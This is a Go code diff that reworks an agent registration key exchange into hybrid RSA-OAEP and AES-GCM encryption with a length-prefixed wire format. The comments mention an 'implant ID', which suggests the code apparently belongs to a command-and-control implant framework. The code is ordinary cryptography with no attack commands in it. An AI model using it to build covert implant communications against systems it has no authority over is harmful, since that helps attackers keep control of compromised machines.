@@ -3,6 +3,7 @@ package crypto
 import (
 	"crypto/rsa"
 	"crypto/sha256"
+	"encoding/binary"
 	"errors"
 )
 
@@ -13,35 +14,57 @@ type KeyExchangeRequest struct {
 	EncryptedBlob []byte // RSA-OAEP encrypted: AES key + serialized registration data
 }
 
-// PackKeyExchange encrypts an AES session key and payload together using RSA.
-// The agent calls this to build the registration request.
+// PackKeyExchange builds the registration blob using hybrid encryption: the
+// 32-byte AES session key is RSA-OAEP encrypted (small, fits in one RSA
+// block), while the registration payload is AES-GCM encrypted under that
+// session key. This removes RSA's message-size limit so larger registration
+// payloads (e.g. with implant ID) do not overflow.
+//
+// Wire format: [2-byte big-endian rsaLen][rsaBlob][aesBlob]
 func PackKeyExchange(serverPubKey *rsa.PublicKey, sessionKey []byte, payload []byte) ([]byte, error) {
 	if len(sessionKey) != AESKeySize {
 		return nil, errors.New("session key must be 32 bytes")
 	}
 
-	// Combine: [32-byte AES key][payload]
-	blob := make([]byte, 0, len(sessionKey)+len(payload))
-	blob = append(blob, sessionKey...)
-	blob = append(blob, payload...)
+	rsaBlob, err := RSAEncrypt(serverPubKey, sessionKey)
+	if err != nil {
+		return nil, err
+	}
 
-	return RSAEncrypt(serverPubKey, blob)
+	aesBlob, err := AESEncrypt(sessionKey, payload)
+	if err != nil {
+		return nil, err
+	}
+
+	out := make([]byte, 0, 2+len(rsaBlob)+len(aesBlob))
+	var lenBuf [2]byte
+	binary.BigEndian.PutUint16(lenBuf[:], uint16(len(rsaBlob)))
+	out = append(out, lenBuf[:]...)
+	out = append(out, rsaBlob...)
+	out = append(out, aesBlob...)
+	return out, nil
 }
 
-// UnpackKeyExchange decrypts the registration blob using the server's RSA private key.
-// Returns the AES session key and the remaining payload.
+// UnpackKeyExchange parses a hybrid registration blob, returning the AES
+// session key and the decrypted registration payload.
 func UnpackKeyExchange(serverPrivKey *rsa.PrivateKey, encrypted []byte) (sessionKey []byte, payload []byte, err error) {
-	blob, err := RSADecrypt(serverPrivKey, encrypted)
+	if len(encrypted) < 2 {
+		return nil, nil, errors.New("key exchange blob too short")
+	}
+	rsaLen := int(binary.BigEndian.Uint16(encrypted[:2]))
+	if len(encrypted) < 2+rsaLen {
+		return nil, nil, errors.New("key exchange blob truncated")
+	}
+
+	sessionKey, err = RSADecrypt(serverPrivKey, encrypted[2:2+rsaLen])
 	if err != nil {
 		return nil, nil, err
 	}
 
-	if len(blob) < AESKeySize {
-		return nil, nil, errors.New("decrypted blob too short to contain AES key")
+	payload, err = AESDecrypt(sessionKey, encrypted[2+rsaLen:])
+	if err != nil {
+		return nil, nil, err
 	}
-
-	sessionKey = blob[:AESKeySize]
-	payload = blob[AESKeySize:]
 	return sessionKey, payload, nil
 }
 
